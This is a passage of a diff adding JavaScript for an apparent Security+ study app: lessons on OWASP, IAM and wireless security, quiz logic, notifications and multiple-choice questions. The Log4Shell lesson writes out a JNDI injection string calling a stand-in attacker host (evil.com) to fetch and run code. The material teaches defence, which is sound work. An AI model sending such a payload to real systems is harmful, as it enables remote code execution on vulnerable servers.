+    icon: "🕸️",
+    title: "OWASP Top 10 & App Security",
+    meta: "IMPLEMENTATION · 15 min",
+    status: "active",
+    content: `
+      <h3>OWASP TOP 10 — CURRENT LIST</h3>
+      <strong>1. Broken Access Control</strong> — users accessing resources they shouldn't. Most common.<br>
+      <strong>2. Cryptographic Failures</strong> — data in transit/rest without proper encryption.<br>
+      <strong>3. Injection</strong> — SQL, command, LDAP injection. Untrusted input executed as code.<br>
+      <strong>4. Insecure Design</strong> — security not considered at design phase. Can't be patched.<br>
+      <strong>5. Security Misconfiguration</strong> — default creds, open storage, verbose errors.<br>
+      <strong>6. Vulnerable & Outdated Components</strong> — Log4Shell is the textbook example.<br>
+      <strong>7. Auth Failures</strong> — weak passwords, no MFA, broken session management.<br>
+      <strong>8. Software & Data Integrity Failures</strong> — supply chain attacks, insecure deserialization.<br>
+      <strong>9. Logging & Monitoring Failures</strong> — not detecting attacks because nothing is logged.<br>
+      <strong>10. SSRF</strong> — server tricked into fetching internal resources for attacker.<br><br>
+      
+      <div class="highlight">Most tested on Security+: Injection, Broken Access Control, Security Misconfiguration.</div>
+      
+      <h3>INPUT VALIDATION</h3>
+      Never trust user input. Treat everything external as potentially malicious.<br><br>
+      • <strong>Allowlist</strong> — only permit known good input. Strongest approach.<br>
+      • <strong>Denylist</strong> — block known bad. Weaker — attackers bypass via encoding/obfuscation.<br><br>
+      Input validation defeats Injection, XSS, SSRF, and Broken Access Control simultaneously.
+      
+      <h3>SAST VS DAST</h3>
+      • <strong>SAST</strong> — analyzes source code without running it. Early in development. Like reading a recipe for bad ingredients.<br>
+      • <strong>DAST</strong> — tests the running application from outside like an attacker. Finds runtime issues SAST misses.<br>
+      • <strong>IAST</strong> — agents inside the running app, best of both worlds.<br><br>
+      
+      <h3>LOG4SHELL (CVE-2021-44228)</h3>
+      Java logging library Log4j executed code embedded in log messages. Attacker sends <code>${"$"}{jndi:ldap://evil.com/x}</code> in any logged field — server fetches and executes attacker code. Zero auth required. Affected millions of products globally.
+    `
+  },
+  {
+    id: 9,
+    icon: "🎫",
+    title: "Identity & Access Management",
+    meta: "IMPLEMENTATION · 15 min",
+    status: "active",
+    content: `
+      <h3>KERBEROS</h3>
+      Network authentication protocol used in Active Directory. Password used once — everything after runs on tickets.<br><br>
+      • <strong>KDC</strong> — Key Distribution Center (Domain Controller). Central authority.<br>
+      • <strong>TGT</strong> — Ticket Granting Ticket. Your master ticket after login. Valid 10hrs default.<br>
+      • <strong>Service Ticket</strong> — access token for a specific resource.<br><br>
+      <div class="highlight">Think theme park: wristband (TGT) gets you ride tickets (service tickets) without showing ID again.</div>
+      
+      <h3>KERBEROS ATTACKS</h3>
+      • <strong>Pass the Ticket</strong> — steal TGT/service ticket from memory, reuse it to authenticate<br>
+      • <strong>Golden Ticket</strong> — compromise KDC, forge TGTs for ANY user. Game over.<br>
+      • <strong>Kerberoasting</strong> — request service tickets, crack them offline to get service account passwords<br><br>
+      
+      <h3>SAML</h3>
+      Enterprise SSO federation. XML-based. Three players: User, Service Provider (SP), Identity Provider (IdP).<br><br>
+      IdP authenticates user → sends signed XML assertion to SP → SP grants access. Password never touches the SP.<br><br>
+      
+      <h3>OAUTH 2.0 & OIDC</h3>
+      • <strong>OAuth 2.0</strong> — authorization delegation. "Login with Google" — grants scoped access via tokens. Never shares your password.<br>
+      • <strong>OIDC</strong> — sits on top of OAuth, adds authentication/identity. OAuth alone doesn't prove who you are.<br><br>
+      
+      <h3>ACCESS CONTROL MODELS</h3>
+      • <strong>RBAC</strong> — Role Based. Permissions assigned to roles, users assigned to roles. Easiest to manage at scale.<br>
+      • <strong>DAC</strong> — Discretionary. Resource owner controls access.<br>
+      • <strong>MAC</strong> — Mandatory. System enforces labels/classifications. Military environments.<br>
+      • <strong>ABAC</strong> — Attribute Based. Policies based on multiple attributes. Most flexible, most complex.<br><br>
+      
+      <h3>RADIUS & LDAP</h3>
+      • <strong>RADIUS</strong> — Remote Authentication Dial-In User Service. Centralizes authentication for network access (VPN, WiFi). Uses UDP.<br>
+      • <strong>LDAP</strong> — Lightweight Directory Access Protocol. Queries directory services like Active Directory. Port 389 (plain), 636 (LDAPS encrypted).
+    `
+  },
+  {
+    id: 6,
+    icon: "📡",
+    title: "Wireless & Network Security",
+    meta: "IMPLEMENTATION · 12 min",
+    status: "active",
+    content: `
+      <h3>WPA2 VS WPA3</h3>
+      <strong>WPA2:</strong><br>
+      • AES-CCMP encryption<br>
+      • PSK authentication — everyone shares one password<br>
+      • Vulnerable to KRACK and PMKID offline brute force<br>
+      • No forward secrecy<br><br>
+      
+      <strong>WPA3:</strong><br>
+      • SAE (Dragonfly handshake) replaces PSK<br>
+      • <strong>Forward Secrecy</strong> — past sessions stay encrypted even if password compromised<br>
+      • Requires real-time interaction per auth attempt — defeats offline brute force<br>
+      • 192-bit enterprise mode<br><br>
+      
+      <h3>EAP TYPES</h3>
+      • <strong>EAP-TLS</strong> — certificates both sides, most secure<br>
+      • <strong>PEAP</strong> — only server cert, client uses username/password<br>
+      • <strong>EAP-FAST</strong> — Cisco proprietary, Protected Access Credentials<br><br>
+      
+      <div class="highlight">Open WiFi + HTTPS: content is protected by TLS but DNS queries are visible. Attacker sees which sites you visit even if not what you do there.</div>
+      
+      <h3>KEY PORTS TO MEMORIZE</h3>
+      FTP:21 · SSH/SFTP:22 · SMTP:25 · DNS:53 · HTTP:80 · HTTPS:443 · LDAP:389 · LDAPS:636 · RDP:3389 · SNMP:161
+    `
+  }
+];
+
+const DOMAINS = [
+  { name: "Threats, Attacks & Vulnerabilities", weight: "22%", color: "#ff3355" },
+  { name: "Architecture & Design", weight: "18%", color: "#8855ff" },
+  { name: "Implementation", weight: "25%", color: "#00d4ff" },
+  { name: "Operations & Incident Response", weight: "16%", color: "#ff8800" },
+  { name: "Governance, Risk & Compliance", weight: "19%", color: "#00ff88" }
+];
+
+// ============================================================
+// STATE
+// ============================================================
+let state = {
+  totalAnswered: 0,
+  totalCorrect: 0,
+  streak: 0,
+  missedQuestions: [],
+  domainStats: {},
+  currentTidbit: 0,
+  seenTidbits: []
+};
+
+let quiz = {
+  questions: [],
+  current: 0,
+  correct: 0,
+  answered: false,
+  timer: null,
+  timeLeft: 0,
+  startTime: null,
+  mode: 'full'
+};
+
+// Load state from localStorage
+try {
+  const saved = localStorage.getItem('secplusState');
+  if (saved) state = { ...state, ...JSON.parse(saved) };
+} catch(e) {}
+
+function saveState() {
+  try { localStorage.setItem('secplusState', JSON.stringify(state)); } catch(e) {}
+}
+
+// ============================================================
+// NAVIGATION
+// ============================================================
+function showScreen(id) {
+  document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+}
+
+function navTo(screenId, navId) {
+  showScreen(screenId);
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById(navId).classList.add('active');
+}
+
+// ============================================================
+// HOME SCREEN
+// ============================================================
+function initHome() {
+  // Stats
+  document.getElementById('totalAnswered').textContent = state.totalAnswered;
+  document.getElementById('totalCorrect').textContent = state.totalCorrect;
+  document.getElementById('currentStreak').textContent = state.streak;
+
+  const pct = state.totalAnswered > 0 ? Math.round((state.totalCorrect / state.totalAnswered) * 100) : 0;
+  document.getElementById('headerScore').textContent = pct + '%';
+  document.getElementById('headerStreak').textContent = state.streak;
+
+  // Tidbit
+  const t = TIDBITS[state.currentTidbit % TIDBITS.length];
+  document.getElementById('tidbitText').innerHTML = t.short;
+
+  // Domain list
+  const dl = document.getElementById('domainList');
+  dl.innerHTML = '';
+  DOMAINS.forEach(d => {
+    const stats = state.domainStats[d.name] || { answered: 0, correct: 0 };
+    const dpct = stats.answered > 0 ? Math.round((stats.correct / stats.answered) * 100) : 0;
+    dl.innerHTML += `
+      <div class="domain-item">
+        <div class="domain-top">
+          <div class="domain-name">${d.name}</div>
+          <div class="domain-pct" style="color:${d.color}">${dpct}%</div>
+        </div>
+        <div class="domain-bar"><div class="domain-fill" style="width:${dpct}%; background: linear-gradient(90deg, ${d.color}, ${d.color}88)"></div></div>
+        <div class="domain-weight">EXAM WEIGHT: ${d.weight} · ${stats.answered} answered</div>
+      </div>`;
+  });
+}
+
+// ============================================================
+// TIDBIT
+// ============================================================
+function showTidbit() {
+  const t = TIDBITS[state.currentTidbit % TIDBITS.length];
+  document.getElementById('modalCategory').textContent = t.category;
+  document.getElementById('modalTitle').textContent = t.title;
+  document.getElementById('modalBody').innerHTML = t.body;
+  document.getElementById('tidbitModal').classList.add('show');
+  
+  // Advance to next tidbit
+  state.currentTidbit = (state.currentTidbit + 1) % TIDBITS.length;
+  saveState();
+  
+  // Update banner
+  const next = TIDBITS[state.currentTidbit % TIDBITS.length];
+  document.getElementById('tidbitText').innerHTML = next.short;
+}
+
+function closeTidbitModal(e) {
+  if (e.target === document.getElementById('tidbitModal')) {
+    document.getElementById('tidbitModal').classList.remove('show');
+  }
+}
+
+function showTidbits() {
+  showScreen('tidbitScreen');
+  const feed = document.getElementById('tidbitFeed');
+  feed.innerHTML = '';
+  TIDBITS.forEach((t, i) => {
+    feed.innerHTML += `
+      <div class="tidbit-banner" onclick="showTidbitById(${i})" style="margin:0">
+        <div class="tidbit-label">⚡ ${t.category}</div>
+        <div class="tidbit-text">${t.short}</div>
+        <div class="tidbit-tap">TAP FOR DEEP DIVE →</div>
+      </div>`;
+  });
+  document.getElementById('tidbitBadge').classList.add('hidden');
+}
+
+function showTidbitById(i) {
+  const t = TIDBITS[i];
+  document.getElementById('modalCategory').textContent = t.category;
+  document.getElementById('modalTitle').textContent = t.title;
+  document.getElementById('modalBody').innerHTML = t.body;
+  document.getElementById('tidbitModal').classList.add('show');
+}
+
+// ============================================================
+// QUIZ
+// ============================================================
+function showQuizModeSelect() {
+  showScreen('quizModeScreen');
+}
+
+function startQuickFire() {
+  startQuiz('quick');
+}
+
+function startQuiz(mode) {
+  quiz.mode = mode;
+  quiz.current = 0;
+  quiz.correct = 0;
+  quiz.answered = false;
+  quiz.startTime = Date.now();
+
+  if (mode === 'full') {
+    quiz.questions = shuffle([...QUESTIONS]).slice(0, 20);
+    quiz.timeLeft = 60 * 45; // 45 min
+  } else if (mode === 'quick') {
+    quiz.questions = shuffle([...QUESTIONS]).slice(0, 10);
+    quiz.timeLeft = 60 * 15;
+  } else if (mode === 'domain') {
+    quiz.questions = shuffle([...QUESTIONS]).slice(0, 10);
+    quiz.timeLeft = 60 * 15;
+  } else if (mode === 'missed') {
+    const missed = QUESTIONS.filter(q => state.missedQuestions.includes(q.id));
+    quiz.questions = missed.length > 0 ? shuffle(missed) : shuffle([...QUESTIONS]).slice(0, 10);
+    quiz.timeLeft = 60 * 20;
+  }
+
+  showScreen('quizScreen');
+  renderQuestion();
+  startTimer();
+}
+
+function shuffle(arr) {
+  for (let i = arr.length - 1; i > 0; i--) {
+    const j = Math.floor(Math.random() * (i + 1));
+    [arr[i], arr[j]] = [arr[j], arr[i]];
+  }
+  return arr;
+}
+
+function renderQuestion() {
+  const q = quiz.questions[quiz.current];
+  const total = quiz.questions.length;
+
+  document.getElementById('quizProgressText').textContent = `Q ${quiz.current + 1} / ${total}`;
+  document.getElementById('quizProgressFill').style.width = ((quiz.current / total) * 100) + '%';
+  document.getElementById('questionDomain').textContent = q.domain;
+  document.getElementById('questionText').textContent = q.text;
+  document.getElementById('explanationBox').classList.remove('show');
+  document.getElementById('quizActionBtn').textContent = 'SUBMIT';
+  document.getElementById('quizActionBtn').onclick = quizAction;
+
+  const letters = ['A', 'B', 'C', 'D'];
+  const ol = document.getElementById('optionsList');
+  ol.innerHTML = '';
+  q.options.forEach((opt, i) => {
+    ol.innerHTML += `
+      <button class="option-btn" id="opt${i}" onclick="selectOption(${i})">
+        <span class="option-letter">${letters[i]}</span>
+        <span class="option-text">${opt}</span>
+      </button>`;
+  });
+
+  quiz.answered = false;
+  quiz.selected = null;
+}
+
+function selectOption(i) {
+  if (quiz.answered) return;
+  quiz.selected = i;
+  document.querySelectorAll('.option-btn').forEach((b, idx) => {
+    b.classList.toggle('selected', idx === i);
+  });
+}
+
+function quizAction() {
+  if (!quiz.answered) {
+    if (quiz.selected === null) return;
+    submitAnswer();
+  } else {
+    nextQuestion();
+  }
+}
+
+function submitAnswer() {
+  const q = quiz.questions[quiz.current];
+  quiz.answered = true;
+
+  const correct = quiz.selected === q.correct;
+
+  document.querySelectorAll('.option-btn').forEach((b, i) => {
+    if (i === q.correct) b.classList.add('correct');
+    else if (i === quiz.selected) b.classList.add('incorrect');
+  });
+
+  document.getElementById('explanationText').innerHTML = q.explanation;
+  document.getElementById('explanationBox').classList.add('show');
+  document.getElementById('quizActionBtn').textContent = quiz.current < quiz.questions.length - 1 ? 'NEXT →' : 'FINISH';
+
+  // Update stats
+  state.totalAnswered++;
+  if (correct) {
+    quiz.correct++;
+    state.totalCorrect++;
+    state.streak++;
+    state.missedQuestions = state.missedQuestions.filter(id => id !== q.id);
+  } else {
+    state.streak = 0;
+    if (!state.missedQuestions.includes(q.id)) state.missedQuestions.push(q.id);
+  }
+
+  // Domain stats
+  if (!state.domainStats[q.domain]) state.domainStats[q.domain] = { answered: 0, correct: 0 };
+  state.domainStats[q.domain].answered++;
+  if (correct) state.domainStats[q.domain].correct++;
+
+  saveState();
+}
+
+function nextQuestion() {
+  if (quiz.current < quiz.questions.length - 1) {
+    quiz.current++;
+    renderQuestion();
+  } else {
+    finishQuiz();
+  }
+}
+
+function finishQuiz() {
+  clearInterval(quiz.timer);
+  const pct = Math.round((quiz.correct / quiz.questions.length) * 100);
+  const elapsed = Math.floor((Date.now() - quiz.startTime) / 1000);
+  const mins = Math.floor(elapsed / 60);
+  const secs = elapsed % 60;
+
+  document.getElementById('resultsScore').textContent = pct + '%';
+  document.getElementById('resultsScore').className = 'results-score ' + (pct >= 75 ? 'pass' : 'fail');
+  document.getElementById('resultsLabel').textContent = pct >= 75 ? '✓ PASS THRESHOLD' : '✗ NEEDS WORK';
+  document.getElementById('resTotal').textContent = quiz.questions.length;
+  document.getElementById('resCorrect').textContent = quiz.correct;
+  document.getElementById('resIncorrect').textContent = quiz.questions.length - quiz.correct;
+  document.getElementById('resTime').textContent = `${mins}m ${secs}s`;
+
+  showScreen('resultsScreen');
+  initHome();
+}
+
+function startTimer() {
+  clearInterval(quiz.timer);
+  updateTimerDisplay();
+  quiz.timer = setInterval(() => {
+    quiz.timeLeft--;
+    updateTimerDisplay();
+    if (quiz.timeLeft <= 0) { clearInterval(quiz.timer); finishQuiz(); }
+  }, 1000);
+}
+
+function updateTimerDisplay() {
+  const mins = Math.floor(quiz.timeLeft / 60);
+  const secs = quiz.timeLeft % 60;
+  const el = document.getElementById('quizTimer');
+  el.textContent = `${mins}:${secs.toString().padStart(2, '0')}`;
+  el.className = 'quiz-timer' + (quiz.timeLeft < 60 ? ' urgent' : '');
+}
+
+// ============================================================
+// LESSONS
+// ============================================================
+function initLessons() {
+  const ll = document.getElementById('lessonsList');
+  ll.innerHTML = '';
+  LESSONS.forEach(l => {
+    ll.innerHTML += `
+      <div class="lesson-card" onclick="showLesson(${l.id})">
+        <div class="lesson-icon">${l.icon}</div>
+        <div class="lesson-info">
+          <div class="lesson-title">${l.title}</div>
+          <div class="lesson-meta">${l.meta}</div>
+        </div>
+        <div class="lesson-status ${l.status}"></div>
+      </div>`;
+  });
+}
+
+function showLesson(id) {
+  const l = LESSONS.find(x => x.id === id);
+  document.getElementById('lessonDetailContent').innerHTML = `
+    <div style="font-family:'Orbitron',monospace;font-size:14px;font-weight:700;color:var(--accent-cyan);margin-bottom:4px;letter-spacing:1px">${l.icon} ${l.title}</div>
+    <div style="font-family:'Share Tech Mono',monospace;font-size:11px;color:var(--text-dim);margin-bottom:20px">${l.meta}</div>
+    <div class="lesson-content">${l.content}</div>
+  `;
+  showScreen('lessonDetailScreen');
+}
+
+// ============================================================
+// PWA INSTALL
+// ============================================================
+let deferredPrompt;
+window.addEventListener('beforeinstallprompt', (e) => {
+  e.preventDefault();
+  deferredPrompt = e;
+  document.getElementById('installBanner').classList.remove('hidden');
+});
+
+function installApp() {
+  if (deferredPrompt) {
+    deferredPrompt.prompt();
+    deferredPrompt.userChoice.then(() => {
+      deferredPrompt = null;
+      document.getElementById('installBanner').classList.add('hidden');
+    });
+  }
+}
+
+// Hide install banner if already installed
+if (window.matchMedia('(display-mode: standalone)').matches) {
+  document.getElementById('installBanner').classList.add('hidden');
+}
+
+// ============================================================
+// SERVICE WORKER + NOTIFICATIONS
+// ============================================================
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/sw.js').catch(() => {});
+}
+
+function requestNotifications() {
+  if ('Notification' in window) {
+    Notification.requestPermission().then(p => {
+      if (p === 'granted') scheduleLocalNotifications();
+    });
+  }
+}
+
+function scheduleLocalNotifications() {
+  // For local notifications without a push server, use setTimeout chains
+  // Fires a tidbit notification every 3 hours while app is open/background
+  const NOTIF_TIDBITS = [
+    { title: "⚡ CRYPTO BRIEF", body: "ECB mode is broken — identical plaintext = identical ciphertext. Always use GCM." },
+    { title: "⚡ ATTACK BRIEF", body: "MFA Fatigue: attacker spams push notifications until you approve one. Defense: number matching." },
+    { title: "⚡ FORENSICS BRIEF", body: "Collect RAM before pulling the plug. Fileless malware lives only in memory." },
+    { title: "⚡ AUTH BRIEF", body: "FIDO2/Passkeys are phishing-proof — architecturally impossible to phish." },
+    { title: "⚡ PROTOCOL BRIEF", body: "SFTP=22 · HTTPS=443 · LDAPS=636 · RDP=3389. Know your ports cold." },
+    { title: "⚡ GOVERNANCE BRIEF", body: "RTO = max downtime. RPO = max data loss. BCP is the plan, DRP is the restore." },
+    { title: "⚡ ATTACK BRIEF", body: "Smishing = SMS phishing. Vishing = voice. Channel determines the name." },
+    { title: "⚡ CRYPTO BRIEF", body: "Salt defeats rainbow tables. Unique random salt per password = precomputed tables useless." }
+  ];
+
+  let idx = 0;
+  function fireNext() {
+    if (Notification.permission !== 'granted') return;
+    const t = NOTIF_TIDBITS[idx % NOTIF_TIDBITS.length];
+    new Notification(t.title, { body: t.body, icon: '🔐' });
+    idx++;
+    setTimeout(fireNext, 3 * 60 * 60 * 1000); // every 3 hours
+  }
+  setTimeout(fireNext, 30 * 60 * 1000); // first one after 30 min
+}
+
+// Auto-request notifications on first load
+setTimeout(() => {
+  if ('Notification' in window && Notification.permission === 'default') {
+    requestNotifications();
+  }
+}, 3000);
+
+// ============================================================
+// EXTRA QUESTIONS (bank expansion)
+// ============================================================
+const EXTRA_QUESTIONS = [
+  {
+    id: 31,
+    domain: "IMPLEMENTATION",
+    text: "Which email authentication protocol specifies which IP addresses are authorized to send email on behalf of a domain?",
+    options: ["DKIM", "SPF", "DMARC", "S/MIME"],
+    correct: 1,
+    explanation: "<strong>SPF (Sender Policy Framework)</strong> — DNS record listing authorized sending IPs. DKIM adds cryptographic signatures. DMARC uses both SPF and DKIM and defines policy for failures (quarantine/reject). All three together = comprehensive email spoofing defense."
+  },
+  {
+    id: 32,
+    domain: "ARCHITECTURE",
+    text: "A company moves servers to AWS. The cloud provider secures physical hardware and the hypervisor. The company secures the OS and applications. What model is this?",
+    options: ["SaaS", "PaaS", "IaaS", "FaaS"],
+    correct: 2,
+    explanation: "<strong>IaaS (Infrastructure as a Service)</strong> — provider owns hardware, hypervisor, and physical security. Customer owns OS, middleware, applications, data. Most control, most responsibility. Examples: AWS EC2, Azure VMs."
+  },
+  {
+    id: 33,
+    domain: "ARCHITECTURE",
+    text: "In a SaaS model, who is responsible for patching the underlying operating system?",
+    options: ["The customer", "Shared responsibility", "The cloud provider", "A third party auditor"],
+    correct: 2,
+    explanation: "<strong>Cloud provider</strong> — In SaaS the provider owns everything: hardware, OS, middleware, application. Customer only controls their data and user access. Least control, least responsibility. Examples: Office 365, Salesforce, Gmail."
+  },
+  {
+    id: 34,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker injects malicious SQL commands into a web form input field to extract database contents. What attack is this?",
+    options: ["Cross-Site Scripting", "SQL Injection", "Buffer Overflow", "Directory Traversal"],
+    correct: 1,
+    explanation: "<strong>SQL Injection</strong> — attacker inserts SQL syntax into input fields that gets executed by the database. Can extract, modify, or delete data. Defense: parameterized queries / prepared statements — input is never treated as executable code."
+  },
+  {
+    id: 35,
+    domain: "THREATS & ATTACKS",
+    text: "Malicious JavaScript is injected into a legitimate website and executes in the browsers of visitors. What attack is this?",
+    options: ["SQL Injection", "CSRF", "XSS — Cross-Site Scripting", "Clickjacking"],
+    correct: 2,
+    explanation: "<strong>XSS (Cross-Site Scripting)</strong> — attacker injects malicious scripts into trusted websites. Executes in victim's browser with site's trust level. Can steal cookies, hijack sessions. Defense: input sanitization, Content Security Policy (CSP), HttpOnly cookie flag."
+  },
+  {
+    id: 36,
+    domain: "IMPLEMENTATION",
+    text: "A web application uses HTTPS but an attacker can still read traffic. Which scenario would allow this?",
+    options: ["The attacker broke AES-256 encryption", "SSL stripping downgraded the connection to HTTP", "The server certificate expired", "The attacker captured the IV"],
+    correct: 1,
+    explanation: "<strong>SSL Stripping</strong> — attacker in MitM position intercepts the initial HTTP request before HTTPS redirect, maintains HTTP connection with victim while using HTTPS with the server. Victim sees HTTP, attacker reads plaintext. Defense: HSTS (HTTP Strict Transport Security) — browser refuses HTTP connections."
+  },
+  {
+    id: 37,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker captures a valid authentication token and replays it later to gain unauthorized access. What attack is this?",
+    options: ["Pass the Hash", "Replay Attack", "Session Hijacking", "Credential Stuffing"],
+    correct: 1,
+    explanation: "<strong>Replay Attack</strong> — captured valid credential or token reused to authenticate. Defense: <strong>nonces</strong> (number used once) and timestamps — tokens are time-limited and single-use, replaying an old token fails."
+  },
+  {
+    id: 38,
+    domain: "IMPLEMENTATION",
+    text: "Which access control model assigns permissions based on job functions rather than individual identities?",
+    options: ["DAC — Discretionary Access Control", "MAC — Mandatory Access Control", "RBAC — Role-Based Access Control", "ABAC — Attribute-Based Access Control"],
+    correct: 2,
+    explanation: "<strong>RBAC (Role-Based Access Control)</strong> — permissions assigned to roles, users assigned to roles. Easiest to manage at scale. DAC = owner controls access. MAC = system enforces labels (military). ABAC = policies based on multiple attributes (most flexible, most complex)."
+  },
+  {
+    id: 39,
+    domain: "OPERATIONS",
+    text: "A security team uses a system that correlates logs from firewalls, endpoints, and authentication systems to detect attack patterns no single source would reveal. What is this system?",
+    options: ["IPS", "DLP", "SIEM", "WAF"],
+    correct: 2,
+    explanation: "<strong>SIEM (Security Information and Event Management)</strong> — aggregates and correlates logs from multiple sources. One failed login = noise. Failed login + port scan + DC auth attempt from same IP = correlated attack pattern. SOAR automates response to SIEM alerts."
+  },
+  {
+    id: 40,
+    domain: "ARCHITECTURE",
+    text: "Which concept assumes every user and device is untrusted by default, even if inside the corporate network?",
+    options: ["Defense in Depth", "Network Segmentation", "Zero Trust", "DMZ Architecture"],
+    correct: 2,
+    explanation: "<strong>Zero Trust</strong> — 'never trust, always verify.' Eliminates implicit trust based on network location. Every request authenticated, authorized, and encrypted regardless of origin. Assumes breach as baseline posture."
+  },
+  {
+    id: 41,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker uses a list of username/password pairs from a previous breach to attempt logins on other services, betting users reused credentials. What attack is this?",
+    options: ["Brute Force", "Dictionary Attack", "Credential Stuffing", "Password Spraying"],
+    correct: 2,
+    explanation: "<strong>Credential Stuffing</strong> — uses real stolen credential pairs (not guesses) against other services. Exploits password reuse. Defense: unique passwords per site (password manager), MFA. Different from brute force which tries many passwords against one account."
+  },
+  {
+    id: 42,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker tries one common password (e.g. 'Winter2024!') against thousands of accounts to avoid lockout. What attack is this?",
+    options: ["Brute Force", "Credential Stuffing", "Password Spraying", "Rainbow Table"],
+    correct: 2,
+    explanation: "<strong>Password Spraying</strong> — low and slow. One password across many accounts avoids account lockout triggers. Exploits predictable password patterns. Defense: MFA, account lockout policies, anomaly detection on distributed login failures."
+  },
+  {
+    id: 43,
+    domain: "IMPLEMENTATION",
+    text: "An organization wants users to authenticate once and access multiple applications without re-entering credentials. What technology enables this?",
+    options: ["MFA", "SSO — Single Sign-On", "PKI", "RADIUS"],
+    correct: 1,
+    explanation: "<strong>SSO (Single Sign-On)</strong> — authenticate once, access multiple systems. Implemented via SAML (enterprise federation), OAuth/OIDC (web/mobile). Reduces password fatigue. Risk: compromise of SSO credential = access to all federated systems."
+  },
+  {
+    id: 44,
+    domain: "IMPLEMENTATION",
+    text: "Which protocol is used by enterprise applications to delegate authorization — allowing a user to grant a third-party app limited access to their account without sharing credentials?",
+    options: ["SAML", "RADIUS", "OAuth 2.0", "Kerberos"],
+    correct: 2,
+    explanation: "<strong>OAuth 2.0</strong> — authorization delegation. 'Login with Google' uses OAuth — Google issues an access token, third-party app never sees your Google password. SAML is for enterprise SSO/federation. OIDC (OpenID Connect) adds identity/authentication on top of OAuth."
+  },
+  {
+    id: 45,
+    domain: "GOVERNANCE",
+    text: "A security policy states 'employees must lock workstations when leaving their desk.' A standard supporting this states 'screens must auto-lock after 5 minutes of inactivity.' Which statement is the policy and which is the standard?",
+    options: ["Both are policies", "First is policy, second is standard", "First is standard, second is policy", "Both are standards"],
+    correct: 1,
+    explanation: "First = <strong>Policy</strong> — what must happen and why, high level, no technical specifics. Second = <strong>Standard</strong> — specific mandatory technical requirement that fulfills the policy. Standards specify the measurable implementation detail."
+  },
+  {
+    id: 46,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker exploits a vulnerability that was discovered and weaponized before the vendor knew it existed. What type of attack is this?",
+    options: ["Known Exploit", "Zero Day Attack", "APT", "Supply Chain Attack"],
+    correct: 1,
+    explanation: "<strong>Zero Day</strong> — vulnerability unknown to the vendor, therefore unpatched. Zero days of warning for defenders. Once a patch is released, it's no longer technically a zero day. Zero days are extremely valuable on the exploit market — nation states pay millions for them."
+  },
+  {
+    id: 47,
+    domain: "ARCHITECTURE",
+    text: "A company places public-facing web servers in a network segment separated from the internal corporate network by firewalls on both sides. What is this zone called?",
+    options: ["VLAN", "DMZ", "Air Gap", "Honeypot"],
+    correct: 1,
+    explanation: "<strong>DMZ (Demilitarized Zone)</strong> — network segment between internet and internal network, protected by firewalls on both sides. Hosts public-facing services (web, email, DNS). If a DMZ server is compromised, attackers still face another firewall before reaching internal network."
+  },
+  {
+    id: 48,
+    domain: "OPERATIONS",
+    text: "A system is intentionally deployed with known vulnerabilities to attract and study attackers. What is this called?",
+    options: ["DMZ", "Honeypot", "Sandbox", "SIEM"],
+    correct: 1,
+    explanation: "<strong>Honeypot</strong> — deliberately vulnerable decoy system. Attracts attackers, logs their techniques, wastes their time. A <strong>honeynet</strong> is a network of honeypots. <strong>Sandbox</strong> is an isolated environment for safely executing and analyzing suspicious code."
+  },
+  {
+    id: 49,
+    domain: "IMPLEMENTATION",
+    text: "Which protocol replaced Telnet for secure remote command-line access to network devices?",
+    options: ["HTTPS", "SSH", "SFTP", "RDP"],
+    correct: 1,
+    explanation: "<strong>SSH (Secure Shell)</strong> — port 22 — encrypts remote terminal sessions. Telnet sends everything including credentials in plaintext. SSH uses asymmetric crypto for authentication and symmetric for the session. SFTP runs over SSH for secure file transfer."
+  },
+  {
+    id: 50,
+    domain: "THREATS & ATTACKS",
+    text: "Malware encrypts all files on a victim's system and demands payment for the decryption key. What type of malware is this?",
+    options: ["Spyware", "Rootkit", "Ransomware", "Adware"],
+    correct: 2,
+    explanation: "<strong>Ransomware</strong> — encrypts victim data, demands ransom for key. Modern ransomware also exfiltrates data first and threatens to publish it (double extortion). Defense: offline backups, network segmentation to limit spread, email filtering, endpoint detection."
+  },
+  {
+    id: 51,
+    domain: "IMPLEMENTATION",
+    text: "A web application firewall (WAF) is deployed in front of a web server. What type of attacks is it specifically designed to detect and block?",
+    options: ["DDoS floods", "Application layer attacks like SQLi and XSS", "Network layer routing attacks", "Physical access attacks"],
+    correct: 1,
+    explanation: "<strong>WAF (Web Application Firewall)</strong> — operates at Layer 7, inspects HTTP/HTTPS traffic, blocks application-layer attacks: SQL injection, XSS, CSRF, directory traversal. A regular network firewall can't inspect application content — WAF fills that gap."
+  },
+  {
+    id: 52,
+    domain: "ARCHITECTURE",
+    text: "An organization requires that encryption keys be stored separately from the data they protect, managed by dedicated hardware. What device manages these keys?",
+    options: ["TPM", "HSM", "PKI", "CA"],
+    correct: 1,
+    explanation: "<strong>HSM (Hardware Security Module)</strong> — dedicated tamper-resistant hardware for cryptographic key storage and operations. Keys never leave the HSM unencrypted. Used in certificate authorities, payment systems, and high-security environments. TPM is a chip on a motherboard for local device integrity."
+  },
+  {
+    id: 53,
+    domain: "OPERATIONS",
+    text: "After a security incident, the team documents what happened, why controls failed, and how to prevent recurrence. What phase of the incident response lifecycle is this?",
+    options: ["Eradication", "Recovery", "Lessons Learned", "Identification"],
+    correct: 2,
+    explanation: "<strong>Lessons Learned</strong> — final phase of PICERL. Post-incident review: what failed, what worked, what to improve. Produces updated policies, procedures, and controls. Often the most skipped phase under time pressure — and the most valuable for long-term defense improvement."
+  },
+  {
+    id: 54,
+    domain: "THREATS & ATTACKS",
+    text: "An attacker compromises a software vendor's update mechanism to distribute malware to all customers who install updates. What type of attack is this?",
+    options: ["Zero Day", "APT", "Supply Chain Attack", "Watering Hole"],
+    correct: 2,
+    explanation: "<strong>Supply Chain Attack</strong> — targeting a vendor or supplier to reach their customers. SolarWinds 2020 is the textbook example — attackers compromised the build system, malicious code shipped in a legitimate signed update to 18,000+ organizations including US government agencies."
+  },
+  {
+    id: 55,
+    domain: "IMPLEMENTATION",
+    text: "A user's laptop has a chip that stores the BitLocker encryption key and verifies system integrity at boot. What component is this?",
